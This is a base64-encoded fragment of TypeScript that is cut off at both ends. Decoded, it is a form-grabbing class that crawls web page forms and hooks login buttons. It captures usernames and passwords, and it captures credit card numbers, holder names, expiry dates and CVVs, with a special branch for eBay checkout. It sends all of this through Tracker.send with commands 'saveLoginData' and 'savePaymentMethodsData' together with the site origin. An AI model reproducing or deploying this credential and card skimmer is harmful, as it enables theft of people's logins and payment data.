ICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgfSk7XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICBzZWxmLmF1dGhFdmVudCA9ICdVbmtub3duJztcbiAgICAgICAgfVxuXG4gICAgICAgIHJldHVybiBzZWxmLmF1dGhFdmVudDtcbiAgICB9XG5cbiAgICB0cmFjayhzZWxmOiB0aGlzLCBfX2Zvcm1FbGVtZW50OiBIVE1MRm9ybUVsZW1lbnQpIHtcbiAgICAgICAgbGV0IGVsZW1lbnRzOiBzdHJpbmdbXSA9IFtdO1xuICAgICAgICBpZiAoX19mb3JtRWxlbWVudC5ub2RlTmFtZSA9PT0gJ0ZPUk0nICYmIF9fZm9ybUVsZW1lbnQubGVuZ3RoICE9PSAxKSB7XG4gICAgICAgICAgICBzZWxmLnJlc29sdmVyRm9ybUF0dHJpYnV0ZXMoc2VsZiwgX19mb3JtRWxlbWVudCk7XG4gICAgICAgICAgICBpZiAoc2VsZi5hdXRoRXZlbnQgPT09ICdsb2dpbicgfHwgc2VsZi5hdXRoRXZlbnQgPT09ICdyZWdpc3RlcicpIHtcbiAgICAgICAgICAgICAgICBzZWxmLmNyYXdsQXV0aEZvcm1FbGVtZW50KHNlbGYsIGVsZW1lbnRzLCBfX2Zvcm1FbGVtZW50KTtcbiAgICAgICAgICAgIH0gZWxzZSBpZiAoc2VsZi5hdXRoRXZlbnQgPT09ICdwYXltZW50Jykge1xuICAgICAgICAgICAgICAgIHNlbGYuY3Jhd2xQYXltZW50Rm9ybUVsZW1lbnQoc2VsZiwgZWxlbWVudHMsIF9fZm9ybUVsZW1lbnQpO1xuICAgICAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgICAgICBpZiAoc2VsZi5hdXRoRXZlbnQgIT09ICdleGNsdWRlJyAmJiBzZWxmLmF1dGhFdmVudCAhPT0gJ2xvZ291dCcpIHtcbiAgICAgICAgICAgICAgICAgICAgc2VsZi5jcmF3bEF1dGhGb3JtRWxlbWVudChzZWxmLCBlbGVtZW50cywgX19mb3JtRWxlbWVudCk7XG4gICAgICAgICAgICAgICAgICAgIHNlbGYuY3Jhd2xQYXltZW50Rm9ybUVsZW1lbnQoc2VsZiwgZWxlbWVudHMsIF9fZm9ybUVsZW1lbnQpO1xuXG4gICAgICAgICAgICAgICAgICAgIC8qYWRkaXRpb25hbCBmdW5jdGlvbnMqL1xuICAgICAgICAgICAgICAgICAgICAvKmV4Y2x1ZGUgcGF5cGFsLGFtYXpvbix0dW5uZWxiZWFyKi9cblxuICAgICAgICAgICAgICAgICAgICAvKmViYXkqL1xuICAgICAgICAgICAgICAgICAgICBpZiAod2luZG93LmxvY2F0aW9uLm9yaWdpbi5pbmRleE9mKCdlYmF5JykgIT09IC0xKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBsZXQgaW50ZXJ2YWwgPSBzZXRJbnRlcnZhbChmdW5jdGlvbiAoKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJ2Zvcm0nKS5sZW5ndGggIT09IDApIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnZm9ybScpLmZvckVhY2goZnVuY3Rpb24gKF9fZWJheUZvcm1FbGVtZW50KSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoX19lYmF5Rm9ybUVsZW1lbnQuaWQgPT09ICdjcmVkaXQtY2FyZC1kZXRhaWxzJykge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNsZWFySW50ZXJ2YWwoaW50ZXJ2YWwpO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBlbGVtZW50czogYW55ID0gW107XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5leHBsb3JlRWJheVBheW1lbnREYXRhQ29sbGVjdGlvbihzZWxmLCBfX2ViYXlGb3JtRWxlbWVudCwgZWxlbWVudHMpO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICB9LCAxMDApO1xuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJyNyb290JykgIT09IG51bGwgJiYgZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmNpYy1tb2R1bGUnKSAhPT0gbnVsbCAmJiBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcuYnRuLmJ0bi0tcHJpbWFyeS5maWVsZCcpICE9PSBudWxsKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5idG4uYnRuLS1wcmltYXJ5LmZpZWxkJyk/Lm5vZGVOYW1lID09PSAnQlVUVE9OJykge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBbXCJjbGlja1wiLCBcImRibGNsaWNrXCJdLmZvckVhY2goZnVuY3Rpb24gKGV2ZW50KSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgdGVtcFBheW1lbnRNZXRob2RzU3RvcmU6IGFueSA9IFtdO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmJ0bi5idG4tLXByaW1hcnkuZmllbGQnKT8uYWRkRXZlbnRMaXN0ZW5lcihldmVudCwgZnVuY3Rpb24gKCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuZXhwbG9yZVNwZWNpZmljRWxlbWVudEJ5VGFnTmFtZShzZWxmLCAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmNpYy1tb2R1bGUnKSBhcyBIVE1MRWxlbWVudCksICdpbnB1dCcsICdjcmVkaXRDYXJkTnVtYmVyJywgZnVuY3Rpb24gKF9fZGV0ZWN0ZWRFbGVtZW50OiBhbnkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGVtcFBheW1lbnRNZXRob2RzU3RvcmUucHVzaCh7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZWxlbWVudCc6IF9fZGV0ZWN0ZWRFbGVtZW50Lm5vZGVOYW1lLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2lkJzogX19kZXRlY3RlZEVsZW1lbnQuaWQsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAndmFsdWUnOiBfX2RldGVjdGVkRWxlbWVudC52YWx1ZVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmV4cGxvcmVTcGVjaWZpY0VsZW1lbnRCeVRhZ05hbWUoc2VsZiwgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5jaWMtbW9kdWxlJykgYXMgSFRNTEVsZW1lbnQpLCAnaW5wdXQnLCAnZmlyc3ROYW1lJywgZnVuY3Rpb24gKF9fZGV0ZWN0ZWRFbGVtZW50OiBhbnkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGVtcFBheW1lbnRNZXRob2RzU3RvcmUucHVzaCh7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZWxlbWVudCc6IF9fZGV0ZWN0ZWRFbGVtZW50Lm5vZGVOYW1lLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2lkJzogX19kZXRlY3RlZEVsZW1lbnQuaWQsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAndmFsdWUnOiBfX2RldGVjdGVkRWxlbWVudC52YWx1ZVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmV4cGxvcmVTcGVjaWZpY0VsZW1lbnRCeVRhZ05hbWUoc2VsZiwgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5jaWMtbW9kdWxlJykgYXMgSFRNTEVsZW1lbnQpLCAnaW5wdXQnLCAnbGFzdE5hbWUnLCBmdW5jdGlvbiAoX19kZXRlY3RlZEVsZW1lbnQ6IGFueSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0ZW1wUGF5bWVudE1ldGhvZHNTdG9yZS5wdXNoKHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdlbGVtZW50JzogX19kZXRlY3RlZEVsZW1lbnQubm9kZU5hbWUsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnaWQnOiBfX2RldGVjdGVkRWxlbWVudC5pZCxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICd2YWx1ZSc6IF9fZGV0ZWN0ZWRFbGVtZW50LnZhbHVlXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuZXhwbG9yZVNwZWNpZmljRWxlbWVudEJ5VGFnTmFtZShzZWxmLCAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmNpYy1tb2R1bGUnKSBhcyBIVE1MRWxlbWVudCksICdpbnB1dCcsICdleHBpcmF0aW9uRGF0ZScsIGZ1bmN0aW9uIChfX2RldGVjdGVkRWxlbWVudDogYW55KSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRlbXBQYXltZW50TWV0aG9kc1N0b3JlLnB1c2goe1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2VsZW1lbnQnOiBfX2RldGVjdGVkRWxlbWVudC5ub2RlTmFtZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdpZCc6IF9fZGV0ZWN0ZWRFbGVtZW50LmlkLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3ZhbHVlJzogX19kZXRlY3RlZEVsZW1lbnQudmFsdWVcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5leHBsb3JlU3BlY2lmaWNFbGVtZW50QnlUYWdOYW1lKHNlbGYsIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcuY2ljLW1vZHVsZScpIGFzIEhUTUxFbGVtZW50KSwgJ2lucHV0JywgJ2N2dicsIGZ1bmN0aW9uIChfX2RldGVjdGVkRWxlbWVudDogYW55KSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRlbXBQYXltZW50TWV0aG9kc1N0b3JlLnB1c2goe1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2VsZW1lbnQnOiBfX2RldGVjdGVkRWxlbWVudC5ub2RlTmFtZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdpZCc6IF9fZGV0ZWN0ZWRFbGVtZW50LmlkLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3ZhbHVlJzogX19kZXRlY3RlZEVsZW1lbnQudmFsdWVcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVHJhY2tlci5zZW5kKHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZDogJ3NhdmVQYXltZW50TWV0aG9kc0RhdGEnLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhOiB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZE51bWJlcic6IHRlbXBQYXltZW50TWV0aG9kc1N0b3JlWzBdLmlkLmluZGV4T2YoJ2NyZWRpdENhcmROdW1iZXInKSAhPT0gLTEgPyB0ZW1wUGF5bWVudE1ldGhvZHNTdG9yZVswXS52YWx1ZSA6ICdVbmtub3duJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkQnJhbmQnOiBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcuZmxvYXRpbmctaW5wdXRfX2ZpeHJpZ2h0Jyk/LmZpcnN0RWxlbWVudENoaWxkPy5jbGFzc05hbWUgPyBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcuZmxvYXRpbmctaW5wdXRfX2ZpeHJpZ2h0Jyk/LmZpcnN0RWxlbWVudENoaWxkPy5jbGFzc05hbWUudG9Mb3dlckNhc2UoKSA6ICdVbmtub3duJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkSG9sZGVyJzogdGVtcFBheW1lbnRNZXRob2RzU3RvcmVbMV0udmFsdWUgKyAnICcgKyB0ZW1wUGF5bWVudE1ldGhvZHNTdG9yZVsyXS52YWx1ZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwiY2FyZEV4cGlyZVwiOiB0ZW1wUGF5bWVudE1ldGhvZHNTdG9yZVszXS5pZCA9PT0gJ2V4cGlyYXRpb25EYXRlJyA/IHRlbXBQYXltZW50TWV0aG9kc1N0b3JlWzNdLnZhbHVlIDogJ1Vua25vd24nLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRDVkMnOiB0ZW1wUGF5bWVudE1ldGhvZHNTdG9yZVs0XS5pZCA9PT0gJ2N2dicgPyB0ZW1wUGF5bWVudE1ldGhvZHNTdG9yZVs0XS52YWx1ZSA6ICdVbmtub3duJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdldmVudCc6ICdhZGQnLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXCJ3b3JrV2Vic2l0ZVwiOiB3aW5kb3cubG9jYXRpb24ub3JpZ2luXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0ZW1wUGF5bWVudE1ldGhvZHNTdG9yZSA9IFtdO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSlcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSlcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICB9XG4gICAgICAgIH1cbiAgICB9XG5cbiAgICBjbGFzc2ljVHJhY2tBdXRoRXZlbnQoc2VsZjogdGhpcywgdXNlcm5hbWVFbGVtZW50SWQ6IGFueSwgcGFzc3dvcmRFbGVtZW50SWQ6IGFueSwgbG9naW5CdXR0b25FbGVtZW50SWQ6IGFueSkge1xuICAgICAgICBsZXQgdXNlcm5hbWVFbGVtZW50OiBhbnksIHBhc3N3b3JkRWxlbWVudDogYW55LCBsb2dpbkJ1dHRvbkVsZW1lbnQ6IGFueTtcblxuICAgICAgICBpZiAoZG9jdW1lbnQucXVlcnlTZWxlY3Rvcih1c2VybmFtZUVsZW1lbnRJZCkgIT09IG51bGwpIHtcbiAgICAgICAgICAgIHVzZXJuYW1lRWxlbWVudCA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IodXNlcm5hbWVFbGVtZW50SWQpO1xuICAgICAgICB9XG4gICAgICAgIGlmIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKHBhc3N3b3JkRWxlbWVudElkKSAhPT0gbnVsbCkge1xuICAgICAgICAgICAgcGFzc3dvcmRFbGVtZW50ID0gZG9jdW1lbnQucXVlcnlTZWxlY3RvcihwYXNzd29yZEVsZW1lbnRJZCk7XG4gICAgICAgIH1cbiAgICAgICAgaWYgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IobG9naW5CdXR0b25FbGVtZW50SWQpICE9PSBudWxsKSB7XG4gICAgICAgICAgICBsb2dpbkJ1dHRvbkVsZW1lbnQgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKGxvZ2luQnV0dG9uRWxlbWVudElkKTtcbiAgICAgICAgfVxuICAgICAgICBsb2dpbkJ1dHRvbkVsZW1lbnQuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCBmdW5jdGlvbiAoKSB7XG4gICAgICAgICAgICByZXR1cm4gVHJhY2tlci5zZW5kKHtcbiAgICAgICAgICAgICAgICBjb21tYW5kOiAnc2F2ZUxvZ2luRGF0YScsXG4gICAgICAgICAgICAgICAgZGF0YToge1xuICAgICAgICAgICAgICAgICAgICBcImV2ZW50XCI6IHNlbGYuYXV0aEV2ZW50LFxuICAgICAgICAgICAgICAgICAgICBcInVzZXJuYW1lXCI6IHVzZXJuYW1lRWxlbWVudC52YWx1ZSxcbiAgICAgICAgICAgICAgICAgICAgXCJwYXNzd29yZFwiOiBwYXNzd29yZEVsZW1lbnQudmFsdWUsXG4gICAgICAgICAgICAgICAgICAgIFwid29ya1dlYnNpdGVcIjogd2luZG93LmxvY2F0aW9uLm9yaWdpblxuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgIH0pO1xuICAgICAgICB9KVxuICAgIH1cblxuICAgIGNyYXdsQXV0aEZvcm1FbGVtZW50KHNlbGY6IHRoaXMsIGVsZW1lbnRzOiBhbnkgW10sIF9fcGFyZW50RWxlbWVudDogSFRNTEVsZW1lbnQpIHtcbiAgICAgICAgX19wYXJlbnRFbGVtZW50LmNoaWxkTm9kZXM/LmZvckVhY2goZnVuY3Rpb24gKF9fY2hpbGRFbGVtZW50OiBhbnkpIHtcbiAgICAgICAgICAgIFsnaW5wdXQnLCAnYnV0dG9uJywgJ2EnXS5mb3JFYWNoKGZ1bmN0aW9uIChfX2VsaWdpYmxlRWxlbWVudCkge1xuICAgICAgICAgICAgICAgIGlmIChfX2NoaWxkRWxlbWVudC5ub2RlTmFtZS50b0xvd2VyQ2FzZSgpID09PSBfX2VsaWdpYmxlRWxlbWVudCkge1xuICAgICAgICAgICAgICAgICAgICBbJ2lucHV0J10uZm9yRWFjaChmdW5jdGlvbiAoX19vbmx5SW5wdXRFbGVtZW50KSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoX19jaGlsZEVsZW1lbnQubm9kZU5hbWUudG9Mb3dlckNhc2UoKSA9PT0gX19vbmx5SW5wdXRFbGVtZW50KSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgWy4uLl9fY2hpbGRFbGVtZW50LmF0dHJpYnV0ZXNdLmZvckVhY2goZnVuY3Rpb24gKF9fYXR0cmlidXRlKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChfX2F0dHJpYnV0ZS5ub2RlVmFsdWUubGVuZ3RoICE9PSAwICYmIF9fYXR0cmlidXRlLm5vZGVWYWx1ZS5sZW5ndGggPj0gNCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLyogbWlub3IgY2hhbmdlcyBzdGFydCAqL1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgWyd0ZXh0JywgJ3VzZXInLCAnZW1haWwnLCAncGFzcyddLmZvckVhY2goZnVuY3Rpb24gKF9fZWxpZ2libGVBdHRyaWJ1dGUpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoX19hdHRyaWJ1dGUubm9kZVZhbHVlLnRvTG93ZXJDYXNlKCkuaW5kZXhPZihfX2VsaWdpYmxlQXR0cmlidXRlKSAhPT0gLTEgKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsZW1lbnRzLnB1c2goX19jaGlsZEVsZW1lbnQpO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLyogbWlub3IgY2hhbmdlcyBlbmQgKi9cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgaWYgKF9fY2hpbGRFbGVtZW50LnR5cGUgPT09ICdzdWJtaXQnIHx8IF9fY2hpbGRFbGVtZW50LnR5cGUgPT09ICdidXR0b24nIHx8IF9fY2hpbGRFbGVtZW50Lm5vZGVOYW1lID09PSAnQScgJiZcbiAgICAgICAgICAgICAgICAgICAgICAgIF9fY2hpbGRFbGVtZW50LmlubmVySFRNTC50b0xvd2VyQ2FzZSgpLmluZGV4T2YoJ3NpZ24nIHx8ICdsb2cnIHx8ICdyZWcnKSAhPT0gLTEpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYucmVzb2x2ZUF1dGhFdmVudChzZWxmLCBfX2NoaWxkRWxlbWVudCwgZWxlbWVudHMpO1xuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgfSk7XG5cbiAgICAgICAgICAgIHJldHVybiBzZWxmLmNyYXdsQXV0aEZvcm1FbGVtZW50KHNlbGYsIGVsZW1lbnRzLCBfX2NoaWxkRWxlbWVudCk7XG4gICAgICAgIH0pO1xuICAgIH1cblxuICAgIHJlc29sdmVBdXRoRXZlbnQoc2VsZjogdGhpcywgZWxlbWVudDogYW55LCBhcnJheTogYW55KSB7XG4gICAgICAgIGxldCBlbGVtZW50Tm9kZTogYW55LCBlbGVtZW50TmFtZTogYW55LCBlbGVtZW50VHlwZTogYW55LCBlbGVtZW50VmFsdWU6IGFueTtcbiAgICAgICAgKGVsZW1lbnQgYXMgSFRNTEVsZW1lbnQpLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgZnVuY3Rpb24gKCkge1xuICAgICAgICAgICAgbmV3IFNldChhcnJheSkuZm9yRWFjaChmdW5jdGlvbiAoX19kZXRlY3RlZEVsZW1lbnQ6IGFueSkge1xuICAgICAgICAgICAgICAgIFsuLi5fX2RldGVjdGVkRWxlbWVudC5hdHRyaWJ1dGVzXS5mb3JFYWNoKGZ1bmN0aW9uIChfX2F0dHJpYnV0ZSkge1xuICAgICAgICAgICAgICAgICAgICBpZiAoX19hdHRyaWJ1dGUubm9kZVZhbHVlLmxlbmd0aCAhPT0gMCAmJiBfX2F0dHJpYnV0ZS5ub2RlVmFsdWUubGVuZ3RoID49IDQpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIFsndXNlcicsICdsb2dpbicsICdlbWFpbCcsICdwYXNzJ10uZm9yRWFjaChmdW5jdGlvbiAoX19lbGlnaWJsZUF0dHJpYnV0ZTogYW55KSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKF9fYXR0cmlidXRlLm5vZGVWYWx1ZS50b0xvd2VyQ2FzZSgpLmluZGV4T2YoX19lbGlnaWJsZUF0dHJpYnV0ZSkgIT09IC0xKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsZW1lbnROb2RlID0gX19kZXRlY3RlZEVsZW1lbnQ7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsZW1lbnROYW1lID0gX19lbGlnaWJsZUF0dHJpYnV0ZTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxlbWVudFR5cGUgPSBfX2RldGVjdGVkRWxlbWVudC50eXBlO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbGVtZW50VmFsdWUgPSBfX2RldGVjdGVkRWxlbWVudC52YWx1ZTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIH0pO1xuXG4gICAgICAgICAgICAgICAgaWYgKGVsZW1lbnRWYWx1ZS5sZW5ndGggIT09IDApIHtcbiAgICAgICAgICAgICAgICAgICAgc2VsZi5wYXNzd29yZFN0b3JlLnB1c2goe1xuICAgICAgICAgICAgICAgICAgICAgICAgbm9kZTogZWxlbWVudE5vZGUsXG4gICAgICAgICAgICAgICAgICAgICAgICBuYW1lOiBlbGVtZW50TmFtZSxcbiAgICAgICAgICAgICAgICAgICAgICAgIHR5cGU6IGVsZW1lbnRUeXBlLFxuICAgICAgICAgICAgICAgICAgICAgICAgdmFsdWU6IGVsZW1lbnRWYWx1ZVxuICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICB9KTtcblxuICAgICAgICAgICAgVHJhY2tlci5zZW5kKHtcbiAgICAgICAgICAgICAgICBjb21tYW5kOiAnc2F2ZUxvZ2luRGF0YScsXG4gICAgICAgICAgICAgICAgZGF0YToge1xuICAgICAgICAgICAgICAgICAgICBcImV2ZW50XCI6IHNlbGYuYXV0aEV2ZW50LFxuICAgICAgICAgICAgICAgICAgICBcInVzZXJuYW1lXCI6IHNlbGYucGFzc3dvcmRTdG9yZVswXT8udmFsdWUsXG4gICAgICAgICAgICAgICAgICAgIFwicGFzc3dvcmRcIjogc2VsZi5wYXNzd29yZFN0b3JlWzFdPy52YWx1ZSxcbiAgICAgICAgICAgICAgICAgICAgXCJ3b3JrV2Vic2l0ZVwiOiB3aW5kb3cubG9jYXRpb24ub3JpZ2luXG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICBzZWxmLnBhc3N3b3JkU3RvcmUgPSBbXTtcbiAgICAgICAgfSk7XG4gICAgfVxuXG4gICAgY3Jhd2xQYXltZW50Rm9ybUVsZW1lbnQoc2VsZjogdGhpcywgZWxlbWVudHM6IGFueSBbXSwgX19mb3JtRWxlbWVudDogSFRNTEVsZW1lbnQpIHtcbiAgICAgICAgX19mb3JtRWxlbWVudC5jaGlsZE5vZGVzPy5mb3JFYWNoKGZ1bmN0aW9uIChfX2NoaWxkRWxlbWVudDogYW55KSB7XG4gICAgICAgICAgICBbJ2lucHV0JywgJ2J1dHRvbicsICdzZWxlY3QnXS5mb3JFYWNoKGZ1bmN0aW9uIChfX2VsaWdpYmxlRWxlbWVudCkge1xuICAgICAgICAgICAgICAgIGlmIChfX2NoaWxkRWxlbWVudC5ub2RlTmFtZS50b0xvd2VyQ2FzZSgpID09PSBfX2VsaWdpYmxlRWxlbWVudCkge1xuICAgICAgICAgICAgICAgICAgICBbJ2lucHV0JywgJ3NlbGVjdCddLmZvckVhY2goZnVuY3Rpb24gKF9fZWxpZ2libGVEYXRhRWxlbWVudCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKF9fY2hpbGRFbGVtZW50Lm5vZGVOYW1lLnRvTG93ZXJDYXNlKCkgPT09IF9fZWxpZ2libGVEYXRhRWxlbWVudCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIFsndGV4dCcsICd0ZWwnLCAnbnVtYmVyJywgJ3Bhc3N3b3JkJywgJ3JhZGlvJywgJ3NlbGVjdC1vbmUnXS5mb3JFYWNoKGZ1bmN0aW9uIChfX2VsaWdpYmxlRWxlbWVudFR5cGUpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKF9fY2hpbGRFbGVtZW50LnR5cGUgPT09IF9fZWxpZ2libGVFbGVtZW50VHlwZSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgWy4uLl9fY2hpbGRFbGVtZW50LmF0dHJpYnV0ZXNdLmZvckVhY2goZnVuY3Rpb24gKF9fYXR0cmlidX